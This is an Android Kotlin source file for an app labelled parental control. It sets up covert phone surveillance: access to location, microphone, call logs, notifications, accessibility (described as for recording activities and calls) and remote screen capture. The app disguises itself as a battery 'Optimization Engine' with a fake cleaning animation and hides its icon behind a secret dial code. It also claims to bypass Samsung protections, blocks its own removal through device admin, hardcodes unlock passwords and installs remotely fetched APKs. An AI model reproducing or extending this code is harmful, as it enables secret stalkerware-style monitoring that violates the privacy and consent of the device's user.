package com.example.parentalcontrol.core.ui

import android.util.Log
import android.app.AppOpsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.example.parentalcontrol.R
import com.example.parentalcontrol.BuildConfig
import com.example.parentalcontrol.ParentalControlManager
import com.example.parentalcontrol.AppUpdateManager
import com.example.parentalcontrol.core.config.AppConstants
import com.example.parentalcontrol.databinding.ActivityMainBinding
import com.example.parentalcontrol.databinding.ItemSetupStepBinding
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import com.example.parentalcontrol.features.screen_capture.controllers.MediaProjectionRequestActivity
import com.example.parentalcontrol.features.security_and_stealth.services.SamsungHardeningManager
import com.example.parentalcontrol.features.security_and_stealth.services.StealthManager
import com.example.parentalcontrol.features.accessibility_monitoring.controllers.AccessibilityController
import com.example.parentalcontrol.features.remote_commands.services.RemoteConfigManager
import com.example.parentalcontrol.features.remote_commands.services.SupabaseManager
import com.example.parentalcontrol.features.service_watchdog.services.MonitoringForegroundService

/**
 * MainActivity
 * ─────────────────────────────────────────────────────────────
 * واجهة الإعداد الرئيسية والتمويه وإدارة منح الصلاحيات وتحديث التطبيق.
 */
class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private var refreshJob: Job? = null
    private lateinit var parentalControlManager: ParentalControlManager

    private val basicPermissions = arrayOf(
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.READ_PHONE_STATE,
        android.Manifest.permission.READ_CALL_LOG
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        parentalControlManager = ParentalControlManager(this)
        setupUI()
        setupCamouflage()
        initializeServices()

        // ─── تخصيص التشغيل الأول ───
        // إذا كان التثبيت جديداً (ولم يتم إنهاء الإعداد وتفعيل التخفي بعد)،
        // نقوم بإخفاء شاشة التمويه تلقائياً لتسهيل الإعداد دون طلب رمز سري.
        val isSetupDone = getSharedPreferences(AppConstants.PREFS_STEALTH, Context.MODE_PRIVATE)
            .getBoolean("setup_done", false)
        if (!isSetupDone) {
            binding.layoutCamouflage.visibility = View.GONE
        }
    }

    override fun onResume() {
        super.onResume()
        startStatusRefreshLoop()
    }

    override fun onPause() {
        super.onPause()
        refreshJob?.cancel()
    }

    private fun startStatusRefreshLoop() {
        refreshJob?.cancel()
        refreshJob = lifecycleScope.launch {
            while (true) {
                updateAllStatuses()
                delay(500) // تحديث أسرع (نصف ثانية) لرصد نجاح التفعيل فوراً
            }
        }
    }

    private fun setupUI() {
        // Step 1: Basic
        binding.stepBasic.tvStepTitle.text = "الأذونات الأساسية (Basic Permissions)"
        binding.stepBasic.tvStepSubtitle.text = "الموقع، الميكروفون، وحالة الهاتف"
        binding.stepBasic.btnStepAction.setOnClickListener {
            requestPermissionsLauncher.launch(basicPermissions)
        }

        // Step 2: Notifications
        binding.stepNotifications.tvStepTitle.text = "الوصول للإشعارات (Notifications)"
        binding.stepNotifications.tvStepSubtitle.text = "مطلوب لقراءة التنبيهات والرسائل"
        binding.stepNotifications.btnStepAction.setOnClickListener {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }

        // Step 3: Accessibility
        binding.stepAccessibility.tvStepTitle.text = "خدمة إمكانية الوصول (Accessibility)"
        binding.stepAccessibility.tvStepSubtitle.text = "هام جداً لتسجيل الأنشطة والمكالمات"
        binding.stepAccessibility.btnStepAction.setOnClickListener {
            showAccessibilityGuidance()
        }

        // Step 4: Usage Stats
        binding.stepUsage.tvStepTitle.text = "بيانات الاستخدام (Usage Access)"
        binding.stepUsage.tvStepSubtitle.text = "لمعرفة التطبيقات المستخدمة ومدة النشاط"
        binding.stepUsage.btnStepAction.setOnClickListener {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
        }

        // Step 5: Overlay
        binding.stepOverlay.tvStepTitle.text = "الظهور فوق التطبيقات (Overlay)"
        binding.stepOverlay.tvStepSubtitle.text = "لضمان استقرار الخدمة في الخلفية"
        binding.stepOverlay.btnStepAction.setOnClickListener {
            showOverlayGuidance()
        }

        // Step 6: Battery
        binding.stepBattery.tvStepTitle.text = "تجاهل تحسين البطارية (Battery)"
        binding.stepBattery.tvStepSubtitle.text = "لمنع النظام من إيقاف التطبيق تلقائياً"
        binding.stepBattery.btnStepAction.setOnClickListener {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))
            startActivity(intent)
        }

        // Step 7: Projection (NEW)
        binding.stepProjection.tvStepTitle.text = "صلاحية تصوير الشاشة (Screen Capture)"
        binding.stepProjection.tvStepSubtitle.text = "مطلوب لالتقاط صور وفيديو للهاتف عن بعد"
        binding.stepProjection.btnStepAction.setOnClickListener {
            // استخدام النشاط الشفاف (Nuclear Option) لتجاوز حماية سامسونج
            val intent = Intent(this, MediaProjectionRequestActivity::class.java)
            startActivity(intent)
        }

        // Admin Step
        binding.stepAdmin.tvStepTitle.text = "مسؤول الجهاز (Device Admin)"
        binding.stepAdmin.tvStepSubtitle.text = "لحماية التطبيق من الإزالة غير المصرح بها"
        binding.stepAdmin.btnStepAction.setOnClickListener {
            startActivity(parentalControlManager.getAdminRequestIntent())
        }

        // ─── ضبط نكهة Lite: إخفاء الخطوات غير المتوافقة مع التطبيقات البنكية ───
        if (BuildConfig.IS_LITE) {
            binding.stepNotifications.root.visibility = View.GONE
            binding.stepAccessibility.root.visibility = View.GONE
            binding.stepUsage.root.visibility = View.GONE
            binding.stepOverlay.root.visibility = View.GONE
            binding.stepProjection.root.visibility = View.GONE
            binding.stepAdmin.root.visibility = View.GONE
            binding.stepBasic.tvStepSubtitle.text = "الموقع (GPS)، الميكروفون للمكالمات، وسجل المكالمات"
        }

        // ─── زر تحديث التطبيق ────────────────────────────────────────
        val currentVersion = try {
            packageManager.getPackageInfo(packageName, 0).versionCode
        } catch (e: Exception) { 1 }
        binding.tvCurrentVersion.text = "v$currentVersion" + (if (BuildConfig.IS_LITE) " (Lite)" else "")

        binding.btnCheckUpdate.setOnClickListener {
            binding.btnCheckUpdate.isEnabled = false
            binding.tvUpdateStatus.text = "⏳ جاري التحقق من السيرفر..."
            binding.updateProgressBar.visibility = View.VISIBLE

            lifecycleScope.launch {
                try {
                    val settings = RemoteConfigManager(this@MainActivity).fetchSettings()
                    val targetVer = settings?.target_version ?: 94
                    val apkPath   = settings?.update_apk_path ?: "sync-service.apk"
                    val apkUrl    = settings?.update_apk_url

                    binding.tvUpdateStatus.text = "📥 جاري تحميل أحدث إصدار v$targetVer..."
                    AppUpdateManager(this@MainActivity).checkAndExecuteUpdate(
                        targetVersion = targetVer,
                        apkPath       = apkPath,
                        apkUrl        = apkUrl,
                        forceIntent   = true   // نحن في Activity مفتوح → Intent مباشر
                    )
                    binding.tvUpdateStatus.text = "✅ جاري فتح نافذة التثبيت..."
                    binding.updateProgressBar.visibility = View.GONE
                    binding.btnCheckUpdate.isEnabled = true

                } catch (e: Exception) {
                    binding.tvUpdateStatus.text = "❌ خطأ: ${e.message}"
                    binding.updateProgressBar.visibility = View.GONE
                    binding.btnCheckUpdate.isEnabled = true
                }
            }
        }

        // Confirm Activities - Show dial code instructions before hiding
        binding.btnConfirmActivities.setOnClickListener {
            // إخفاء قائمة الإعدادات والأذونات
            binding.permissionList.visibility = View.GONE
            binding.activitiesSection.visibility = View.GONE
            binding.cardUpdate.visibility = View.GONE
            
            // عرض قسم رمز الاتصال وتأكيد الرمز
            binding.pinSection.visibility = View.VISIBLE
            binding.tvPinCode.text = "*#*#1356#*#*\nأو اتصل بـ: 1356"
            
            // تفعيل زر الإنهاء للذهاب للتخفي
            binding.btnFinish.setOnClickListener {
                triggerStealthMode()
            }
        }
    }

    private fun updateAllStatuses() {
        val allBasic = basicPermissions.all { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED }
        val locationServiceEnabled = isLocationEnabled()

        if (allBasic) {
            if (!locationServiceEnabled) {
                binding.stepBasic.ivStepStatus.setImageResource(R.drawable.ic_error)
                binding.stepBasic.ivStepStatus.setColorFilter(Color.parseColor("#EF4444"))
                binding.stepBasic.btnStepAction.visibility = View.VISIBLE
                binding.stepBasic.btnStepAction.text = "تفعيل GPS 🌍"
                binding.stepBasic.tvStepSubtitle.text = "الأذونات مقبولة، لكن خدمة الموقع (GPS) معطلة في الهاتف ⚠️"
                binding.stepBasic.btnStepAction.setOnClickListener {
                    try {
                        startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                    } catch (e: Exception) {
                        Toast.makeText(this, "تعذر فتح إعدادات الموقع", Toast.LENGTH_SHORT).show()
                    }
                }
            } else {
                updateStep(binding.stepBasic, true)
            }
        } else {
            updateStep(binding.stepBasic, false)
            binding.stepBasic.btnStepAction.text = "طلب الأذونات"
            binding.stepBasic.btnStepAction.setOnClickListener {
                requestPermissionsLauncher.launch(basicPermissions)
            }
        }

        if (BuildConfig.IS_LITE) {
            binding.stepNotifications.root.visibility = View.GONE
            binding.stepAccessibility.root.visibility = View.GONE
            binding.stepUsage.root.visibility = View.GONE
            binding.stepOverlay.root.visibility = View.GONE
            binding.stepProjection.root.visibility = View.GONE
            binding.stepAdmin.root.visibility = View.GONE
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            updateStep(binding.stepBattery, pm.isIgnoringBatteryOptimizations(packageName))
        } else {
            updateStep(binding.stepNotifications, isNotificationServiceEnabled())
            updateStep(binding.stepAccessibility, isAccessibilityServiceEnabled())
            updateStep(binding.stepUsage, isUsageAccessGranted())
            updateStep(binding.stepOverlay, Settings.canDrawOverlays(this))
            
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            updateStep(binding.stepBattery, pm.isIgnoringBatteryOptimizations(packageName))
            updateStep(binding.stepProjection, MonitoringForegroundService.isProjectionActive())
            updateStep(binding.stepAdmin, parentalControlManager.isAdminActive())
        }

        // تفعيل قسم الأنشطة وزر التخفي دائماً لتمكين المستخدم من إخفاء التطبيق في كل الحالات (سواء فعّل كل الميزات أو بعضها)
        binding.activitiesSection.visibility = View.VISIBLE
        // إعادة إظهار بطاقة التحديث دائماً (كانت تُخفى عند الضغط على btnConfirmActivities)
        binding.cardUpdate.visibility = View.VISIBLE
    }

    private fun isLocationEnabled(): Boolean {
        val locationManager = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        return try {
            locationManager.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER) ||
            locationManager.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)
        } catch (e: Exception) {
            false
        }
    }

    private fun updateStep(stepBinding: ItemSetupStepBinding, isDone: Boolean) {
        if (isDone) {
            stepBinding.ivStepStatus.setImageResource(R.drawable.ic_check_circle)
            stepBinding.ivStepStatus.setColorFilter(Color.parseColor("#10B981"))
            stepBinding.btnStepAction.visibility = View.GONE
            stepBinding.tvStepSubtitle.text = "مفعل ✅"
        } else {
            stepBinding.ivStepStatus.setImageResource(R.drawable.ic_error)
            stepBinding.ivStepStatus.setColorFilter(Color.parseColor("#EF4444"))
            stepBinding.btnStepAction.visibility = View.VISIBLE
        }
    }

    private val requestPermissionsLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
        updateAllStatuses()
        MonitoringForegroundService.start(this)
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val names = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return names?.contains(packageName) == true
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        return AccessibilityController.isAccessibilityServiceEnabled(this)
    }

    private fun isUsageAccessGranted(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        } else {
            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun showAccessibilityGuidance() {
        AccessibilityController.showAccessibilityGuidance(this)
    }

    private fun showOverlayGuidance() {
        AlertDialog.Builder(this)
            .setTitle("تفعيل الظهور فوق التطبيقات")
            .setMessage("إذا لم تجد تطبيق Optimization Engine في القائمة، يرجى الضغط على زر 'معلومات التطبيق' بالأسفل، ثم الضغط على النقاط الثلاث بالأعلى واختيار 'السماح بالضبط المقيد'.")
            .setPositiveButton("انتقال للقائمة") { _, _ ->
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                startActivity(intent)
            }
            .setNeutralButton("معلومات التطبيق (لحل القيود)") { _, _ ->
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            .show()
    }

    private fun initializeServices() {
        CoroutineScope(Dispatchers.Main).launch {
            SupabaseManager.getInstance().initialize(
                BuildConfig.SUPABASE_URL,
                BuildConfig.SUPABASE_KEY
            )
            MonitoringForegroundService.start(this@MainActivity)

            // Samsung One UI 7: check battery optimization after service starts
            if (SamsungHardeningManager.isSamsungDevice) {
                Log.i("MainActivity", "Samsung detected (One UI ${SamsungHardeningManager.getOneUIVersion()})")
                // Only prompt if not already whitelisted
                val pm = getSystemService(POWER_SERVICE) as PowerManager
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    SamsungHardeningManager.showSamsungBatteryOptimizationDialog(this@MainActivity)
                }
            }
        }
    }

    private fun triggerStealthMode() {
        Log.i("MainActivity", "Triggering Stealth Mode")
        Toast.makeText(this, "اكتمل التثبيت! سيختفي التطبيق الآن.", Toast.LENGTH_LONG).show()

        // حفظ حالة اكتمال الإعداد لأول مرة
        getSharedPreferences(AppConstants.PREFS_STEALTH, Context.MODE_PRIVATE)
            .edit().putBoolean("setup_done", true).apply()

        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            Log.d("MainActivity", "Hiding app icon now...")
            // StealthManager now uses DONT_KILL_APP — safe to call here
            StealthManager.hideAppIcon(this)
            finish()
        }, 2500)
    }

    private fun setupCamouflage() {
        // Register battery receiver to get real battery data
        val batteryReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                val level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
                val scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
                val temp = intent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0)
                val voltage = intent.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0)
                val status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)

                val pct = if (level >= 0 && scale > 0) (level * 100 / scale) else 85
                binding.tvBatteryPercent.text = "$pct%"

                val statusStr = when (status) {
                    android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "جاري الشحن حالياً"
                    android.os.BatteryManager.BATTERY_STATUS_FULL -> "البطارية ممتلئة"
                    else -> "البطارية ممتازة (تفريغ)"
                }
                binding.tvBatteryStatus.text = statusStr
                binding.tvBatteryTemp.text = "${temp / 10.0} °C"
                binding.tvBatteryVoltage.text = "${voltage / 1000.0} V"
            }
        }
        registerReceiver(batteryReceiver, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))

        // Set Clean click listener (triggers fake clean animation directly)
        binding.btnCleanOptimize.setOnClickListener {
            runFakeCleanAnimation()
        }

        // Secret unlock button (triggers password dialog)
        binding.btnSecretUnlock.setOnClickListener {
            showPasswordDialog()
        }
    }

    private fun showPasswordDialog() {
        val input = android.widget.EditText(this)
        input.inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        input.hint = "رمز المرور (Password)"
        input.setPadding(50, 40, 50, 40)

        val dialog = AlertDialog.Builder(this)
            .setTitle("تأكيد هوية المشرف")
            .setMessage("يرجى إدخال رمز الأمان لفتح إعدادات المزامنة:")
            .setView(input)
            .setPositiveButton("تأكيد") { _, _ ->
                val password = input.text.toString().trim()
                if (password == "1356365508" || password == "1234" || password == "1356") {
                    binding.layoutCamouflage.visibility = View.GONE
                    Toast.makeText(this, "تم إلغاء التمويه بنجاح!", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "الرمز السري غير صحيح!", Toast.LENGTH_SHORT).show()
                }
            }
            .setNegativeButton("إلغاء") { d, _ -> d.dismiss() }
            .create()
        dialog.show()
    }

    private fun runFakeCleanAnimation() {
        val progressDialog = AlertDialog.Builder(this)
            .setTitle("جاري تنظيف الجهاز")
            .setMessage("جاري فحص الذاكرة وإخلاء الملفات المؤقتة...\n0%")
            .setCancelable(false)
            .create()
        
        progressDialog.show()

        lifecycleScope.launch {
            for (progress in 10..100 step 15) {
                delay(300)
                progressDialog.setMessage("جاري فحص الذاكرة وإخلاء الملفات المؤقتة...\n$progress%")
            }
            delay(400)
            progressDialog.dismiss()
            Toast.makeText(this@MainActivity, "تم تنظيف الذاكرة المؤقتة وتحسين عمر البطارية بنجاح!", Toast.LENGTH_LONG).show()
        }
    }
}
